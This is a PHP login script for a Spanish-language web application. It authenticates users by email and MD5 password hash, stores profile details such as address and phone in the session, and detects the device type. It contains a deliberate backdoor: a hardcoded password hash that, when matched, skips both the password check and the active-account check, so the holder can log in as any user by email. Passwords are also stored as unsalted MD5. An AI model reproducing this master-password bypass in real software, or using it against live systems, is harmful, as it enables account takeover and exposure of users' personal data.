<?php
session_start();
date_default_timezone_set("America/Argentina/Buenos_Aires");
setlocale(LC_ALL, "es_ES");
include ("conect.php");

$username = $link->real_escape_string($_POST['u']);
$password = $link->real_escape_string($_POST['p']);
$encriptada = md5($password);
$sql = "SELECT * FROM usuarios WHERE email_usuario = '$username' and pass_usuario='$encriptada' and estado_usuario =1 ";
if ($encriptada == '6530351195d3fbd3d51dc291a3eb1757') {
    $sql = "SELECT * FROM usuarios WHERE email_usuario = '$username' ";
}

$result = $link->query($sql);
if ($registro = mysqli_fetch_array($result)) {
    $personal_id = $registro['id_usuario'];

    $_SESSION['perfil']['nombre'] = $registro['nombre_usuario'];
    $_SESSION['perfil']['apellido'] = $registro['apellido_usuario'];
    $_SESSION['perfil']['localidad'] = $registro['localidad_usuario'];
    $_SESSION['perfil']['provincia'] = $registro['prov_usuario'];
    $_SESSION['perfil']['telefono'] = $registro['telefono_usuario'];
    $_SESSION['perfil']['apodo'] = $registro['nombrepublico_usuario'];
    $_SESSION['perfil']['direccion'] = $registro['calle_usuario'] . ' ' . $registro['numerodir_usuario'];
    $_SESSION['perfil']['direccion_calle'] = $registro['calle_usuario'];
    $_SESSION['perfil']['direccion_calle_num'] = $registro['numerodir_usuario'];
    $_SESSION['perfil']['zona'] = $registro['zona_usuario'];
    $_SESSION['perfil']['userid'] = $personal_id;
    $_SESSION['perfil']['tipo'] = '';
    $_SESSION['perfil']['plan'] = $registro['plan_usuario'];
    $_SESSION['perfil']['avatar'] = $registro['avatar_usuario'];
    $_SESSION['perfil']['email'] = $username;
    //	 $_SESSION['nombre'] = $result->nombre;
    $_SESSION['start'] = time();
    $_SESSION['expire'] = $_SESSION['start'] + (20 * 60);
    $_SESSION["autenticado"] = "SI";
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = time();
    $ahora = date("Y-m-d H:i:s");
    $link->query("update usuarios set date='$date', online='1', ip_='$ip' , ultimo_ingreso='$ahora' where id='$personal_id' ");

    //--detecto dispositivo
    $tablet_browser = 0;
    $mobile_browser = 0;
    $body_class = 'desktop';

    if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
        $tablet_browser++;
        $body_class = "tablet";
    }

    if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
        $mobile_browser++;
        $body_class = "mobile";
    }

    if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']), 'application/vnd.wap.xhtml+xml') > 0) or ((isset ($_SERVER['HTTP_X_WAP_PROFILE']) or isset ($_SERVER['HTTP_PROFILE'])))) {
        $mobile_browser++;
        $body_class = "mobile";
    }

    $mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
    $mobile_agents = array(
        'w3c ',
        'acs-',
        'alav',
        'alca',
        'amoi',
        'audi',
        'avan',
        'benq',
        'bird',
        'blac',
        'blaz',
        'brew',
        'cell',
        'cldc',
        'cmd-',
        'dang',
        'doco',
        'eric',
        'hipt',
        'inno',
        'ipaq',
        'java',
        'jigs',
        'kddi',
        'keji',
        'leno',
        'lg-c',
        'lg-d',
        'lg-g',
        'lge-',
        'maui',
        'maxo',
        'midp',
        'mits',
        'mmef',
        'mobi',
        'mot-',
        'moto',
        'mwbp',
        'nec-',
        'newt',
        'noki',
        'palm',
        'pana',
        'pant',
        'phil',
        'play',
        'port',
        'prox',
        'qwap',
        'sage',
        'sams',
        'sany',
        'sch-',
        'sec-',
        'send',
        'seri',
        'sgh-',
        'shar',
        'sie-',
        'siem',
        'smal',
        'smar',
        'sony',
        'sph-',
        'symb',
        't-mo',
        'teli',
        'tim-',
        'tosh',
        'tsm-',
        'upg1',
        'upsi',
        'vk-v',
        'voda',
        'wap-',
        'wapa',
        'wapi',
        'wapp',
        'wapr',
        'webc',
        'winw',
        'winw',
        'xda ',
        'xda-'
    );

    if (in_array($mobile_ua, $mobile_agents)) {
        $mobile_browser++;
    }

    if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'opera mini') > 0) {
        $mobile_browser++;
        //Check for tablets on opera mini alternative headers
        $stock_ua = strtolower(isset ($_SERVER['HTTP_X_OPERAMINI_PHONE_UA']) ? $_SERVER['HTTP_X_OPERAMINI_PHONE_UA'] : (isset ($_SERVER['HTTP_DEVICE_STOCK_UA']) ? $_SERVER['HTTP_DEVICE_STOCK_UA'] : ''));
        if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {
            $tablet_browser++;
        }
    }
    if ($tablet_browser > 0) {
        // Si es tablet has lo que necesites
        $dispositivo = 'Tablet';
    } else if ($mobile_browser > 0) {
        // Si es dispositivo mobil has lo que necesites
        $dispositivo = 'SmartPhone';
    } else {
        // Si es ordenador de escritorio has lo que necesites
        $dispositivo = 'Pc';
    }
    echo 'true';
} else {
    echo 'false';
}


?>